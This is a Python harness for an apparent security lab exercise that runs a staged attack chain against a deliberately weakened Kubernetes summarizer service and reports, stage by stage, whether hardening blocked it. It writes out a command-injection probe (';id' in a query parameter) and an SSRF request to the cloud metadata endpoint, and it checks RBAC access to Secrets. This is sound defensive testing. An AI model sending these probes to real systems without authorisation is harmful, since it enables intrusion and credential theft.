#!/usr/bin/env python3
"""
demo.py — the Attack Range exercise, one stage at a time.

This replaces the old killchain.sh, which ran under `set -euo pipefail`: a single
blocked stage aborted the script and hid whether the later controls held. Here
every stage runs and is judged on its own, so a hardened run shows a verdict for
each control, not just the first one that fired.

Each stage returns one of three statuses, kept distinct on purpose:

  exploited  the planted weakness worked (expected on the baseline)
  blocked    a control stopped it (expected after `make harden`)
  error      the stage could not be evaluated (collection gap, not a control)

An `error` is never rendered as `blocked`: a stage that failed to run is not a
stage that was defended.

The Kubernetes-identity stages (4, 5) are evaluated with `kubectl auth can-i
--as=<the app ServiceAccount>`, so they test the RBAC binding and Secret access
directly and do not depend on first winning RCE in stage 1. That is the
assume-breach fixture: we grant ourselves the adversary's identity and ask what
it is allowed to do, independent of how it would have been obtained.

Usage:
  APP_URL=http://<lb> python3 demo.py                 # judge the live posture
  APP_URL=http://<lb> python3 demo.py --out run.json   # also save results
  python3 demo.py --compare baseline.json hardened.json  # before/after matrix
"""
from __future__ import annotations

import argparse
import json
import os
import subprocess
import sys
import urllib.request

NS = "summarizer"
SA = f"system:serviceaccount:{NS}:{NS}"
IMDS = "169.254.169.254"

EXPLOITED, BLOCKED, ERROR, INFO = "exploited", "blocked", "error", "info"

# One row per stage: id, name, and the control layer that is meant to stop it.
STAGES = [
    ("0", "Recon", "n/a (discovery)"),
    ("1", "Foothold via RCE", "app (input validation)"),
    ("2", "SSRF to IMDS", "app (fixed upstream) + cloud (IMDS hop limit)"),
    ("3", "Lateral move with node creds", "cloud (scoped node IAM role)"),
    ("4", "Privilege escalation via SA token", "kubernetes (RBAC + automount)"),
    ("5", "Trophy: read the canary Secret", "kubernetes (RBAC) + no secret in env"),
]


# ----------------------------------------------------------------------------
# Pure classification helpers (unit-tested in test_demo.py). No I/O in here.
# ----------------------------------------------------------------------------

def classify_rce(status_code: int | None, stdout: str) -> str:
    """Stage 1. Command output proves RCE; a 400 proves the input was rejected."""
    if status_code is None:
        return ERROR
    if status_code == 400:
        return BLOCKED
    if status_code == 200 and "uid=" in stdout:
        return EXPLOITED
    if status_code == 200:
        # Ran but the injected command did not execute (e.g. arg-vector ping).
        return BLOCKED
    return ERROR


def classify_ssrf(status_code: int | None, body: str) -> str:
    """Stage 2. Reaching IMDS is the exploit; a rejected/ignored URL is blocked."""
    if status_code is None:
        return ERROR
    if status_code == 200 and IMDS in body:
        return EXPLOITED
    if status_code in (400, 422):
        # Hardened app has no url field, or rejects it outright.
        return BLOCKED
    if status_code == 200:
        # Fetched the fixed upstream instead of the caller's URL.
        return BLOCKED
    return ERROR


def classify_can_i(allowed: bool | None) -> str:
    """Stages 4/5. The SA being allowed the action is the exploit."""
    if allowed is None:
        return ERROR
    return EXPLOITED if allowed else BLOCKED


def classify_secret_trophy(can_get: bool | None, secret_exists: bool | None) -> str:
    """Stage 5. Trophy is readable only if the SA may get it AND it still exists."""
    if can_get is None or secret_exists is None:
        return ERROR
    if can_get and secret_exists:
        return EXPLOITED
    return BLOCKED


def classify_lateral(creds_available: bool, could_read: bool | None) -> str:
    """Stage 3. Needs stolen node creds; without them the control is not exercised."""
    if not creds_available:
        # Upstream (SSRF/hop-limit) held, so no node creds. Honestly an error for
        # THIS control: it was not exercised, so we do not claim it as blocked.
        return ERROR
    if could_read is None:
        return ERROR
    return EXPLOITED if could_read else BLOCKED


def build_matrix(baseline: dict, hardened: dict) -> list[dict]:
    """Join two result sets into before/after rows keyed by stage id."""
    rows = []
    for sid, name, layer in STAGES:
        b = baseline.get(sid, {}).get("status", ERROR)
        h = hardened.get(sid, {}).get("status", ERROR)
        rows.append({"stage": sid, "name": name, "layer": layer,
                     "baseline": b, "hardened": h})
    return rows


def render_matrix(rows: list[dict]) -> str:
    out = ["| Stage | Name | Baseline | Hardened | Control layer |",
           "|---|---|---|---|---|"]
    for r in rows:
        out.append(f"| {r['stage']} | {r['name']} | {r['baseline']} | "
                   f"{r['hardened']} | {r['layer']} |")
    return "\n".join(out)


# ----------------------------------------------------------------------------
# I/O helpers
# ----------------------------------------------------------------------------

def _http(url: str, method: str = "GET", body: bytes | None = None,
          headers: dict | None = None, timeout: int = 10):
    req = urllib.request.Request(url, data=body, method=method, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:  # noqa: S310
            return resp.status, resp.read(8192).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:  # noqa: PERF203
        return e.code, e.read(8192).decode("utf-8", "replace")
    except Exception:  # noqa: BLE001
        return None, ""


def _can_i(verb: str, resource: str, extra: list[str] | None = None) -> bool | None:
    cmd = ["kubectl", "auth", "can-i", verb, resource, "-n", NS, "--as", SA]
    if extra:
        cmd += extra
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=20)
    except Exception:  # noqa: BLE001
        return None
    out = r.stdout.strip().lower()
    if out == "yes":
        return True
    if out == "no":
        return False
    return None


def _secret_exists() -> bool | None:
    try:
        r = subprocess.run(
            ["kubectl", "-n", NS, "get", "secret", "summarizer-key"],
            capture_output=True, text=True, timeout=20,
        )
    except Exception:  # noqa: BLE001
        return None
    return r.returncode == 0


# ----------------------------------------------------------------------------
# Stages (each independent; never raises)
# ----------------------------------------------------------------------------

def run_stages(app_url: str) -> dict:
    results: dict[str, dict] = {}

    # Stage 0: recon (informational, never a control verdict).
    code, body = _http(f"{app_url}/healthz")
    results["0"] = {"status": INFO, "detail": f"healthz {code}"}

    # Stage 1: RCE via command injection.
    code, body = _http(f"{app_url}/tools/diagnose?host=127.0.0.1%3Bid")
    stdout = ""
    try:
        stdout = json.loads(body).get("stdout", "")
    except Exception:  # noqa: BLE001
        stdout = body
    results["1"] = {"status": classify_rce(code, stdout), "detail": f"HTTP {code}"}

    # Stage 2: SSRF pointed at IMDS (baseline accepts url; hardened has no url field).
    payload = json.dumps({
        "url": f"http://{IMDS}/latest/meta-data/",
        "method": "GET",
        "text": "probe",
    }).encode()
    code, body = _http(f"{app_url}/summarize", method="POST", body=payload,
                       headers={"content-type": "application/json"})
    results["2"] = {"status": classify_ssrf(code, body), "detail": f"HTTP {code}"}
    creds_available = results["2"]["status"] == EXPLOITED

    # Stage 3: lateral movement with node creds. Only exercisable if stage 2 won.
    results["3"] = {"status": classify_lateral(creds_available, None),
                    "detail": "needs stolen node creds" if not creds_available
                    else "node creds obtained"}

    # Stage 4: privilege escalation — can the app SA list secrets cluster-wide?
    allowed = _can_i("list", "secrets", ["--all-namespaces"])
    results["4"] = {"status": classify_can_i(allowed), "detail": f"can-i list secrets -A: {allowed}"}

    # Stage 5: trophy — can the SA read the canary Secret, and does it still exist?
    can_get = _can_i("get", "secret/summarizer-key")
    exists = _secret_exists()
    results["5"] = {"status": classify_secret_trophy(can_get, exists),
                    "detail": f"can-i get secret: {can_get}, secret exists: {exists}"}
    return results


def render_run(results: dict) -> str:
    out = ["| Stage | Name | Status | Control layer | Detail |",
           "|---|---|---|---|---|"]
    for sid, name, layer in STAGES:
        r = results.get(sid, {"status": ERROR, "detail": ""})
        out.append(f"| {sid} | {name} | {r['status']} | {layer} | {r.get('detail','')} |")
    return "\n".join(out)


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--out")
    ap.add_argument("--compare", nargs=2, metavar=("BASELINE", "HARDENED"))
    args = ap.parse_args()

    if args.compare:
        with open(args.compare[0]) as f:
            baseline = json.load(f)
        with open(args.compare[1]) as f:
            hardened = json.load(f)
        print(render_matrix(build_matrix(baseline, hardened)))
        return 0

    app_url = os.environ.get("APP_URL")
    if not app_url:
        print("set APP_URL to the summarizer LoadBalancer URL", file=sys.stderr)
        return 2
    results = run_stages(app_url)
    print(render_run(results))
    if args.out:
        with open(args.out, "w") as f:
            json.dump(results, f, indent=2)
        print(f"\nwrote {args.out}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
